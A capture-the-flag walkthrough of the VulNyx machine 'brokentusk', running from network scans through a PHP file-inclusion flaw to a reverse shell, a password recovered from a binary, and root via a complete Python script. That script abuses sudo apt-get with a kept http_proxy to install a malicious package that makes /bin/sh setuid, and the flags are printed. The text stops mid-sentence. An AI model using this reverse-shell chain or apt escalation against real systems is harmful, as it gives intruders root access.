author: zer0arc4
name: brokentusk
category: hard
os: linux
platform: vulnyx

```zsh
❯ arp-scan 192.168.0.0/24
Interface: wlan0, type: EN10MB, MAC: 18:cc:18:d5:c7:df, IPv4: 192.168.0.7
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1     40:ee:15:2c:0b:c4       Zioncom Electronics (Shenzhen) Ltd.
192.168.0.8     08:00:27:d2:de:14       PCS Systemtechnik GmbH
192.168.0.2     90:31:4b:79:86:c5       AltoBeam Inc.
192.168.0.4     6a:2d:99:cb:c4:db       (Unknown: locally administered)
192.168.0.4     6a:12:2c:ee:48:79       (Unknown: locally administered) (DUP: 2)

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.431 seconds (105.31 hosts/sec). 4 responded
❯ ip=192.168.0.8
❯ ping -c 2 $ip
PING 192.168.0.8 (192.168.0.8) 56(84) bytes of data.
64 bytes from 192.168.0.8: icmp_seq=1 ttl=64 time=0.683 ms
64 bytes from 192.168.0.8: icmp_seq=2 ttl=64 time=0.600 ms

--- 192.168.0.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1053ms
rtt min/avg/max/mdev = 0.600/0.641/0.683/0.041 ms
```

```zsh
❯ nmap -p- -Pn $ip
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-15 08:00 +0700
Nmap scan report for 192.168.0.8
Host is up (0.00016s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.85 seconds
```

```zsh
❯ nmap -p22,80 -sCV -Pn --min-rate 5000 $ip
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-15 08:01 +0700
Nmap scan report for 192.168.0.8
Host is up (0.00062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: BrokenTusk | Wildlife Rescue Foundation
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.80 seconds
```

```zsh
❯ whatweb $ip
ERROR Opening: https://192.168.0.8 - Connection refused - connect(2) for "192.168.0.8" port 443
http://192.168.0.8 [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.0.8], PHP[8.0.30], Script, Title[BrokenTusk | Wildlife Rescue Foundation], X-Powered-By[PHP/8.0.30], nginx
```

```zsh
❯ gobuster dir -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,php --exclude-length 26659 -b 403,404
                                                                                   ===============================================================                    Gobuster v3.8.2                                                                    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.8/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   403,404
[+] Exclude Length:          26659
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
api                  (Status: 301) [Size: 162] [--> http://192.168.0.8/api/]
app                  (Status: 301) [Size: 162] [--> http://192.168.0.8/app/]
vuln.php             (Status: 200) [Size: 223]
Progress: 14256 / 14256 (100.00%)
===============================================================
Finished
===============================================================
```

```zsh
❯ curl -i http://$ip/vuln.php
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 15 Nov 2026 01:06:12 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.30


Warning: include(home): Failed to open stream: No such file or directory in /var/www/html/vuln.php on line 3

Warning: include(): Failed opening 'home' for inclusion (include_path='.:') in /var/www/html/vuln.php on line 3
```

```zsh
❯ ffuf -u "http://$ip/vuln.php?FUZZ=/etc/passwd" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 223
                                                                                                             /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       git-20260926-8d65e037
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.0.8/vuln.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 223
________________________________________________

page                    [Status: 200, Size: 1237, Words: 12, Lines: 25, Duration: 29ms]
:: Progress: [4752/4752] :: Job [1/1] :: 1503 req/sec :: Duration: [0:00:03] :: Errors: 0 :
```

```zsh
❯ curl -i "http://$ip/vuln.php?page=/etc/passwd"
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 15 Nov 2026 01:08:33 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.0.30

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
zer0arc4:x:1000:1000:zer0arc4,,,:/home/zer0arc4:/bin/bash
```

using this PoC:
`https://github.com/TheCyberGeek/php2shell-research/tree/main/A_session_lfi`

setup revshell first:
```zsh
❯ nc -lvnp 9999
Listening on 0.0.0.0 999
```

```zsh
❯ python3 chain_a_session_lfi.py --target http://$ip --lfi-path /vuln.php --session-path /tmp/sessions --lhost 192.168.0.7 --lport 9999
[*] Target: http://192.168.0.8:80                                                                    [*] Reverse shell -> 192.168.0.7:9999  (start your listener first)
[attempt 1] SID=exploit968b5c3ecdbf4915b982 file=/tmp/sessions/sess_exploit968b5c3ecdbf4915b982
[+] reverse shell fired via /tmp/sessions/sess_exploit968b5c3ecdbf4915b982 -> 192.168.0.7:9999
    check your listener
```

```zsh
Connection received on 192.168.0.8 47790
bash: cannot set terminal process group (668): Inappropriate ioctl for device
bash: no job control in this shell
www-data@BrokenTusk:~/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```zsh
www-data@BrokenTusk:~/html$ cd /opt
cd /opt
www-data@BrokenTusk:/opt$ ls -la
ls -la
total 28
drwxr-xr-x  3 root root  4096 Oct 31 17:19 .
drwxr-xr-x 18 root root  4096 Nov  3 03:58 ..
-rwxr-xr-x  1 root root 14512 Oct 31 17:19 passgoblin
drwxr-xr-x  5 root root  4096 Nov 14 19:56 php2shell
www-data@BrokenTusk:/opt$ ./passgoblin
./passgoblin
hell
Welcome to the PassGoblin, user zer0arc4!
Enter the Secret Key to view the credentials:
Access Denied! Invalid Secret Key.
```

```zsh
www-data@BrokenTusk:/opt$ strings passgoblin
strings passgoblin
]J.A
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
strcspn
__libc_start_main
__cxa_finalize
strchr
memset
printf
strcmp
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
ABCDEFGHH
IJKLMNOPH
QRSTUVWXH
YZabcdefH
ghijklmnH
opqrstuvH
wxyz0123H
456789+/H
ggWelcome to the PassGoblin, user zer0arc4!
Enter the Secret Key to view the credentials:
Q09NUElMRURfV0lUSE9VVF9FUlJPUlNfQlVUX0ZVTExfT0ZfRVhJU1RFTlRJQUxfQ1JJU0lT
Access Granted!
Username: zer0arc4
Password: %s
The key said hello, the password said goodbye to its privacy.
Access Denied! Invalid Secret Key.
;*3$"
GCC: (Debian 16.2.0-1) 16.2.0
.shstrtab
.note.gnu.build-id
.interp
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.note.gnu.property
.note.ABI-tag
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

```zsh
❯ echo 'Q09NUElMRURfV0lUSE9VVF9FUlJPUlNfQlVUX0ZVTExfT0ZfRVhJU1RFTlRJQUxfQ1JJU0lT' | base64 -d
COMPILED_WITHOUT_ERRORS_BUT_FULL_OF_EXISTENTIAL_CRISIS
```

```zsh
www-data@BrokenTusk:/opt$ ./passgoblin
./passgoblin
COMPILED_WITHOUT_ERRORS_BUT_FULL_OF_EXISTENTIAL_CRISIS
Welcome to the PassGoblin, user zer0arc4!
Enter the Secret Key to view the credentials:
Access Granted!
Username: zer0arc4
Password: TooBigToHide123!

The key said hello, the password said goodbye to its privacy.
```

```zsh
❯ ssh zer0arc4@$ip
zer0arc4@192.168.0.8's password:
zer0arc4@BrokenTusk:~$ id;whoami;hostname
uid=1000(zer0arc4) gid=1000(zer0arc4) groups=1000(zer0arc4),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth)
zer0arc4
BrokenTusk
zer0arc4@BrokenTusk:~$ sudo -l
Matching Defaults entries for zer0arc4 on BrokenTusk:
    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy", mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User zer0arc4 may run the following commands on BrokenTusk:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
```

using my written script to become root:

```python
#!/usr/bin/env python3
import os
import subprocess
import threading
import http.server
import socketserver
import hashlib
import shutil

def main():
    print("[*] 1. Setting up directories...")
    os.system("rm -rf /tmp/bashpwn /tmp/repo")
    os.makedirs("/tmp/bashpwn/DEBIAN", exist_ok=True)
    os.makedirs("/tmp/bashpwn/bin", exist_ok=True)
    os.makedirs("/tmp/repo", exist_ok=True)

    print("[*] 2. Creating malicious .deb package...")
    shutil.copy("/bin/dash", "/tmp/bashpwn/bin/bash")
    os.chmod("/tmp/bashpwn/bin/bash", 0o755)

    with open("/tmp/bashpwn/DEBIAN/control", "w") as f:
        f.write("""Package: bash
Version: 100011
Section: shells
Priority: required
Architecture: all
Maintainer: attacker
Description: bash
""")

    with open("/tmp/bashpwn/DEBIAN/postinst", "w") as f:
        f.write("""#!/bin/sh
cp /bin/dash /bin/bash
chown root:root /bin/bash
chmod 755 /bin/bash
chown root:root /bin/sh
chmod +s /bin/sh
chown root:root /bin/dash
chmod +s /bin/dash
""")
    os.chmod("/tmp/bashpwn/DEBIAN/postinst", 0o755)

    subprocess.run(
        ["dpkg-deb", "--build", "/tmp/bashpwn", "/tmp/repo/pwn.deb"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=True
    )

    print("[*] 3. Generating Packages file...")
    with open("/tmp/repo/pwn.deb", "rb") as f:
        data = f.read()
    
    size = len(data)
    md5 = hashlib.md5(data).hexdigest()
    sha256 = hashlib.sha256(data).hexdigest()

    with open("/tmp/repo/Packages", "w") as f:
        f.write(f"""Package: bash
Version: 100011
Architecture: all
Maintainer: attacker
Filename: pwn.deb
Size: {size}
MD5sum: {md5}
SHA256: {sha256}
Description: bash
""")

    print("[*] 4. Starting Python HTTP Proxy...")
    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if "InRelease" in self.path or "Release" in self.path or "Packages." in self.path:
                self.send_error(404)
            elif "Packages" in self.path:
                with open('/tmp/repo/Packages', 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Content-Length', str(len(content)))
                self.end_headers()
                self.wfile.write(content)
            elif ".deb" in self.path:
                with open('/tmp/repo/pwn.deb', 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'application/vnd.debian.binary-package')
                self.send_header('Content-Length', str(len(content)))
                self.end_headers()
                self.wfile.write(content)
            else:
                self.send_error(404)

        def log_message(self, format, *args):
            pass

    socketserver.TCPServer.allow_reuse_address = True
    httpd = socketserver.TCPServer(("127.0.0.1", 8081), Handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()

    print("[*] 5. Executing APT Exploit...")
    env = os.environ.copy()
    env["http_proxy"] = "http://127.0.0.1:8081"
    env.pop("https_proxy", None)

    subprocess.run(["sudo", "apt-get", "update"], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sh", "-c", "yes | sudo apt-get upgrade"], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    httpd.shutdown()
    print("[*] 6. Automatically elevating to full root shell...")
    
    elev_cmd = 'python3 -c \'import os; os.setgroups([]); os.setgid(0); os.setuid(0); os.execv("/bin/sh", ["/bin/sh"])\''
    
    try:
        subprocess.run(["/bin/sh", "-p", "-c", elev_cmd])
    except Exception as e:
        print(f"[-] Elevation failed: {e}")
        print("[!] Try running manually: /bin/sh -p")

if __name__ == "__main__":
    main()
```

```zsh
zer0arc4@BrokenTusk:~$ python3 /tmp/pwn.py
[*] 1. Setting up directories...
[*] 2. Creating malicious .deb package...
[*] 3. Generating Packages file...
[*] 4. Starting Python HTTP Proxy...
[*] 5. Executing APT Exploit...
[*] 6. Automatically elevating to full root shell...
# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
BrokenTusk
```

```zsh
# cat /home/zer0arc4/user.txt /root/root.txt
9346e4474996a9ba8cc5248f4e5051c5
65742587f1d6944b0ed55f6c1d311e21
```


note:

foothold, lfi2rce:
after found page parameter in vuln.php that vulnerable to lfi, the next step was to upgrade it become rce.

before, i've tried using php filter chain from synactive and log poisoning, but both failed. filter chain failed because iconv extension is turned off in this machine. for log poisoning because nginx log was empty.

looking up for the version of the php is 8.0.30 whis is vulnerable to php2shell. using poc i mentioned above. the 